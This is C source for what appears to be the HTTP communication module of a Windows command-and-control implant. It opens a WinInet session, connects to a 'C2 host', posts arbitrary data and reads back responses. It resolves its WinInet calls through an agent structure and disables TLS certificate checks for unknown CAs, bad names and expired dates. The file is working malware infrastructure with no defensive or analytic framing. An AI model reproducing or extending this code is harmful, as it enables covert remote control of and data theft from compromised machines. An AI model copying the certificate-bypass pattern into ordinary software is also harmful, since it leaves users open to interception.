#include <windows.h>
#include <wininet.h>
#include <Native.h>
#include <Agent.h>
#include <Defines.h>
#include <Internals.h>

// ASCII - wide char (WinINet W-functions need WCHAR; hsotnames and URL's are always ASCII)
// static inline so the compiler inlines it into each DECLGN caller - no separate symbol needed
static inline void str_to_wide( PWCHAR dst, PCHAR src, UINT32 max_len )
{
    UINT32 i = 0;
    while ( src[i] && i < max_len - 1 ) {
        dst[i] = (WCHAR)(BYTE)src[i];
        i++;
    }
    dst[i] = 0;
}

// Open the internet session - call onces, reuse the handle for all requests
DECLFN PVOID Http_Open( PCHAR user_agent )
{
    G_AGENT;

    WCHAR w_ua[256];
    Mem_Set( w_ua, 0, sizeof(w_ua) );
    str_to_wide( w_ua, user_agent, 256 );

    return Self->WinInet.InternetOpenW( w_ua, INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0 );
}

// Connect to the C2 host::port - call once per session
DECLFN PVOID Http_Connect( PVOID h_internet, PCHAR host, UINT16 port )
{
    G_AGENT;

    WCHAR w_host[256];
    Mem_Set( w_host, 0, sizeof(w_host) );
    str_to_wide( w_host, host, 256 );

    return Self->WinInet.InternetConnectW( h_internet, w_host, (INTERNET_PORT)port, 
    nullptr,    // username (none)
    nullptr,    // password (none) 
    INTERNET_SERVICE_HTTP, 0, 0 );
}

// Send a POST request with 'data' as the body. read the full response into a heap buffer
// Caller owns the response buffer - must Heap_Free it when done
DECLFN BOOL Http_Send( PVOID h_connect, PCHAR uri, BOOL use_ssl, PVOID data, UINT32 data_len, PVOID* out_buf, UINT32* out_len )
{
    G_AGENT;

    WCHAR w_uri[512];
    Mem_Set( w_uri, 0, sizeof(w_uri) );
    str_to_wide( w_uri, uri, 512 );

    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
    if ( use_ssl ) {
        flags |= INTERNET_FLAG_SECURE
              |  INTERNET_FLAG_IGNORE_CERT_CN_INVALID
              |  INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
    }

    PVOID h_req = Self->WinInet.HttpOpenRequestW(
        h_connect,
        L"POST",
        w_uri,
        nullptr,    // HTTP/1.1
        nullptr,    // no referrer
        nullptr,    // accept all types
        flags,
        0
    );

    if ( !h_req ) return FALSE;

    // For SSL, also bypass unknown-CA errors (self-signed certs).
    // INTERNET_OPTION_SECURITY_FLAGS = 31; SECURITY_FLAG_IGNORE_UNKNOWN_CA = 0x0100
    if ( use_ssl ) {
        DWORD sec = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                  | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                  | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        Self->WinInet.InternetSetOptionA( h_req, INTERNET_OPTION_SECURITY_FLAGS, &sec, sizeof(sec) );
    }

    BOOL ok =Self->WinInet.HttpSendRequestW(
        h_req,
        L"Content-Type: application/octet-stream\r\n",
        (DWORD)-1,  // auto-calculate header length from the null terminator
        data,
        data_len
    );

    if ( !ok )
    {
        Self->WinInet.InternetCloseHandle( h_req );
        return FALSE;
    }

    // read response in 4 KB chunks into a growing heap buffer
    UINT32 total = 0;
    UINT32 cap = 4096;
    PBYTE buf = (PBYTE)Heap_Alloc( cap );
    if ( !buf )
    {
        Self->WinInet.InternetCloseHandle( h_req );
        return FALSE;
    }

    DWORD chunk = 0;
    do
    {
        if ( total + 4096 > cap )
        {
            cap += 4096;
            buf = (PBYTE)Heap_Realloc( buf, cap );
            if ( !buf )
            {
                Self->WinInet.InternetCloseHandle( h_req );
                return FALSE;
            }
        }

        chunk = 0;
        Self->WinInet.InternetReadFile( h_req, buf + total, 4096, &chunk );
        total += chunk;
    } while ( chunk > 0 );

    Self->WinInet.InternetCloseHandle( h_req );

    if ( out_buf ) *out_buf = buf;
    if ( out_len ) *out_len = total;

    return TRUE;
}

DECLFN void Http_Close( PVOID handle )
{
    G_AGENT;
    if ( handle ) Self->WinInet.InternetCloseHandle( handle );
}







